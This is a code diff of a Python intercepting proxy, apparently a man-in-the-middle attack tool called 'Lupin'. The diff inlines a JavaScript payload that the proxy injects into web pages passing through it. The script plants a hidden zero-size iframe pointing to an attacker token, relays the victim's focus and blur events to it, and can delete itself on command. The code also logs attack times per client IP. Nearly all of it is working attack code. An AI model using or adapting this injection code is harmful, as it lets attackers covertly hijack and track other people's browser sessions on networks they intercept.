@@ -91,7 +91,7 @@ class ServerConnection(HTTPClient):
 
             injectPoint = self.findInjectPoint(data);
             if injectPoint != -1:    
-                print "FRAMING: "+self.client.getHeader("host")
+                #print "FRAMING: "+self.client.getHeader("host")
                 data = self.injectSetupScript(data, injectPoint)
 	 
         
@@ -116,10 +116,38 @@ class ServerConnection(HTTPClient):
     def injectSetupScript(self,data, injectPoint):    
         newData = data[:injectPoint]
         rest = data[injectPoint:]
-        setupScript_fd = open("Lupin/setupScript.js")
-        setupScript =  setupScript_fd.read()
+        setupScript = "function selfDestruct(){ \
+                            master = document.getElementById('masterIframe'); \
+                            master.parentNode.removeChild(master); \
+                        }\
+                        function onMessage(event){ \
+                            m = event.data;\
+                            if('selfDestruct' == m) selfDestruct();\
+                        }\
+                        function onFocus(){\
+	                        n = window.frames.length;\
+	                        window.frames[n-1].postMessage('focus','*');\
+                        }\
+                        function onBlur(){\
+                            n = window.frames.length;\
+                            window.frames[n-1].postMessage('blur','*');\
+                        }\
+                        function initFraming(){\
+                            window.addEventListener('message', onMessage, false); \
+                            window.addEventListener ('blur', onBlur, false);\
+                            window.addEventListener ('focus', onFocus, false);\
+                            masterIframe = document.createElement('IFRAME'); \
+                            masterIframe.setAttribute('src', _LUPIN_FRAME_TOKEN);\
+                            masterIframe.setAttribute('id', 'masterIframe');\
+                            masterIframe.setAttribute('name', 'masterIframe');\
+                            masterIframe.setAttribute('style', 'visibility:hidden;display:none');\
+                            masterIframe.setAttribute('height', '0');\
+                            masterIframe.setAttribute('width', '0');\
+                            document.body.appendChild(masterIframe);\
+                        }\
+                        setTimeout('initFraming()',1000);"
+                        
         newData += "<script type=\"text/javascript\"> _LUPIN_FRAME_TOKEN=\"" + self.PersistentData._LUPIN_TOKEN + self.PersistentData._FRAME + "\";"+setupScript+"</script>" + rest
-        setupScript_fd.close()
         self.client.PersistentData.setLastAttackTime(self.client.getClientIP())	
         return newData
          
